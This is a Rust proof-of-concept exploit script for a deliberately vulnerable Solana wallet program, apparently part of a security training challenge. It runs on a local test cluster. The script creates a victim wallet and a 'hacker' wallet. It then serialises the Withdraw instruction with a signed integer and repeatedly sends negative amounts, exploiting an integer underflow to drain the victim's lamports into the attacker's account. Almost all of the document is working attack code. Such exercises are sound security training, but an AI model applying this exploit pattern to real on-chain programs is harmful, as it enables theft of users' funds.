use kdam::prelude::*;
use kdam::Bar;
use owo_colors::OwoColorize;

use poc_framework::{
    Environment,
    localhost_client,
    keypair, RemoteEnvironment,
    solana_program::{
        pubkey::Pubkey,
        instruction::{AccountMeta, Instruction},
    },
    solana_sdk::{
        system_program,
        signature::{read_keypair_file, Signer},
        bpf_loader_upgradeable::UpgradeableLoaderState,
    },
};


use borsh::{BorshSerialize, BorshDeserialize};

// We use the same Structure created in the Smart Contract
#[derive(Debug, BorshDeserialize, BorshSerialize)]

pub enum WalletInstruction {
    Initialize,
    Deposit { amount: u64 },
    Withdraw { amount: i64 }, //we change the amount primitive type to i64
}

#[repr(C)]
#[derive(Clone, Copy, Debug, Default, PartialEq, BorshSerialize, BorshDeserialize)]
pub struct Wallet {
    pub authority: Pubkey,
}

pub const WALLET_LEN: u64 = 32;

pub fn main() {
    let programa_keypair = read_keypair_file("./target/so/level2-keypair.json").unwrap();
    let programa = programa_keypair.pubkey();
    let cliente1 = localhost_client();
    
    let hacker = keypair(1);
    let authority_info = keypair(2);

    /* Create the PDA */
    let (wallet_address, _) =
    Pubkey::find_program_address(&[&authority_info.pubkey().to_bytes()], &programa);
    
    let (hacker_address, _) =
    Pubkey::find_program_address(&[&hacker.pubkey().to_bytes()], &programa);

    /* First we create the accounts */
 
    let mut env = RemoteEnvironment::new_with_airdrop(cliente1, keypair(2), 10000000000000);
            env.airdrop(hacker.pubkey(), 10000000000);
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false),
                        AccountMeta::new(authority_info.pubkey(), true),
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Initialize.try_to_vec().unwrap(), 
                        }],
                        &[&authority_info],
                    );

            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(hacker_address, false),
                        AccountMeta::new(hacker.pubkey(), true),
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Initialize.try_to_vec().unwrap(), 
                        }],
                        &[&hacker],
                    );

            let wallet_address_info = env.get_account(wallet_address).unwrap().lamports;
            let auth_vault_address_info = env.get_account(authority_info.pubkey()).unwrap().lamports;

            let hacker_address_info = env.get_account(hacker_address).unwrap().lamports;
            let hacker_vault_address_info = env.get_account(hacker.pubkey()).unwrap().lamports;

            println!("");
            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*    INITIALIZING & CREATING ACCOUNTS      *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");
            println!("{} {:?}", "Wallet info address lamports: ".bold().blue(), wallet_address_info.blue());
            println!("{} {:?}", "Auth info address lamports: ".bold().blue(), auth_vault_address_info.blue());
            println!("{} {:?}", "Wallet info deserialized data: ".bold().green(), 
            env.get_deserialized_account::<Wallet>(wallet_address).unwrap().green());    
            println!("");
            println!("");
            println!("{} {:?}", "Hacker wallet lamports: ".bold().blue(), hacker_address_info.blue());
            println!("{} {:?}", "Hacker address lamports: ".bold().blue(), hacker_vault_address_info.blue());
            println!("{} {:?}", "Hacker waller info deserialized data: ".bold().green(), 
            env.get_deserialized_account::<Wallet>(hacker_address).unwrap().green());    
            println!("");
            println!("");   
            
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(wallet_address, false), //<- dest
                        AccountMeta::new(authority_info.pubkey(), true), //<- source 
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Deposit { amount: 1000000000000 }.try_to_vec().unwrap(),
                    }],
                        &[&authority_info],
                    );
                    
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(hacker_address, false), //<- dest
                        AccountMeta::new(hacker.pubkey(), true), //<- source 
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Deposit { amount: 1000 }.try_to_vec().unwrap(),
                    }],
                        &[&hacker],
                    );

            println!("");
            println!("{}", "********************************************".bright_blue().bold());
            println!("{}", "*               TRANSFERING                *".bright_blue().bold());
            println!("{}", "********************************************".bright_blue().bold());
            println!("");
            println!("{} {} {} {}", "From: ".bold().red(), authority_info.pubkey().red(),
            " ---- > AMOUNT: 10000 ---- TO -->".bold().green(), wallet_address.blue());
            println!("");
            println!("");

               /* Third we steal the money */
               println!("");
               println!("{}", "********************************************".bright_blue().bold());
               println!("{}", "*      WITHDRAWING UNDERFLOW/OVERFLOW      *".bright_blue().bold());
               println!("{}", "********************************************".bright_blue().bold());
               println!("");

            env.airdrop(hacker.pubkey(), 10000000000000);
            /*
            Here we are goimg to use the entirely struct location and explain what are we doing and why
            we have to get the min balan of the wallet_address, to do that, we have to use the Rent trait.
            We need to use the Rent trait 'minimum_balance' function 
            https://rust.velas.com/solana_program/rent/struct.Rent.html#method.minimum_balance
            
            To do that, we have to establish the &self keyworkd: https://doc.rust-lang.org/std/keyword.self.html
            
            If we look at the Traits Implementations for "Rent" we find the "Default" Trait
            https://rust.velas.com/solana_program/rent/struct.Rent.html#impl-Default

            Then, if we check that trait "core::default::Default", we see the "default()" function, that will 
            return us the Self type.
            https://doc.rust-lang.org/book/appendix-02-operators.html
            https://doc.rust-lang.org/stable/core/default/trait.Default.html

            Because the function we need needs the &self as first argument:
            "pub fn minimum_balance(&self, data_len: usize) -> u64"
            
            We need to use the default() function before the minimum_balance: ....Rent::trait.function()....
            default().minimum_balance( usize);, so, we can compliance with the two arguments
            */
            let wall_len = env.get_account(hacker_address).unwrap().data.len();
            let min_balance = 
            poc_framework::solana_program::rent::Rent::default().minimum_balance(wall_len as usize);
            println!("Min balance for 32 size: {:?}", hacker_address);

            /* 
            We are using the WalletInstruction struct, but we are going to modify the Withdraw amount 
            primitive type to i64, so we can include negative values to amount Instruction. To understand the
            overflow.
            Check this: https://doc.rust-lang.org/std/#primitives
            */

            let hacker_addr_lamports = env.get_account(hacker.pubkey()).unwrap().lamports;
            let w_wall_lamports = env.get_account(wallet_address).unwrap().lamports;
            
            let mut pb = Bar::new(100);
            println!("");
            println!("");
            println!("Working .......");
            println!("");
            println!("");

            for _i in 0..11 {
            let wall_amount = env.get_account(hacker_address).unwrap().lamports;
            let steal = wall_amount - min_balance;
            let est = steal as i64 * -1;

            pb.update((9.9) as usize);


            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(hacker_address, false), //<- source
                        AccountMeta::new(hacker.pubkey(), true), //<- as signer
                        AccountMeta::new(wallet_address, false), //<- destination,
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Withdraw { amount: est }.try_to_vec().unwrap(),
                    }],
                        &[&hacker],
                    );
            }
            let wall_amount = env.get_account(hacker_address).unwrap().lamports;
            let steal = wall_amount as i64 - min_balance as i64;
            env.execute_as_transaction(
                &[Instruction {
                    program_id: programa,
                    accounts: vec![
                        AccountMeta::new(hacker_address, false), //<- source
                        AccountMeta::new(hacker.pubkey(), true), //<- as signer
                        AccountMeta::new(hacker.pubkey(), false), //<- destination,
                        AccountMeta::new_readonly(poc_framework::solana_program::sysvar::rent::id(), false),
                        AccountMeta::new_readonly(system_program::id(), false),
                        ],
                        data: WalletInstruction::Withdraw { amount: steal }.try_to_vec().unwrap(),
                    }],
                        &[&hacker],
                    );
            
            let hacker_address_lamp2 = env.get_account(hacker.pubkey()).unwrap().lamports;
            let w_wall_info2 = env.get_account(wallet_address).unwrap().lamports;
            
            println!("");
            println!("");
            if hacker_addr_lamports < hacker_address_lamp2 && w_wall_lamports > w_wall_info2 
                { 
                    println!("{}", "HAXXX".green().underline()) 
                } 
                else { 
                    println!("Something went wrong") 
                };
            
            println!("");
            println!("{} {:?}", "Original Wallet initial lamports: ".bold().yellow(), 
            w_wall_lamports.yellow());
            println!("{} {:?}", "Final Wallet lamports: ".bold().green(), 
            w_wall_info2.green());      
            println!("");
            println!("{} {:?}", "Hacker wallet initial lamports: ".bold().yellow(), 
            hacker_addr_lamports.yellow());
            println!("{} {:?}", "Hacker wallet final lamports: ".bold().green(), 
            hacker_address_lamp2.green());
            println!("");
            
            let account = env.get_account(programa).expect("couldn't retrieve account");
            let upgradable: UpgradeableLoaderState = account.deserialize_data().unwrap();
            if let UpgradeableLoaderState::Program {
                programdata_address,
            } = upgradable {println!("{} {:?} {} {:?} {} {:?}", "The PROGRAM EXECUTABLE DATA Account for: "
            .bold().green(), programa.red(), " has this Address: ".bold().green(), programdata_address.red(),
            ", and its account info is the following: ".bold().green(), 
            env.get_account(programdata_address).unwrap().blue());}
            println!("");
}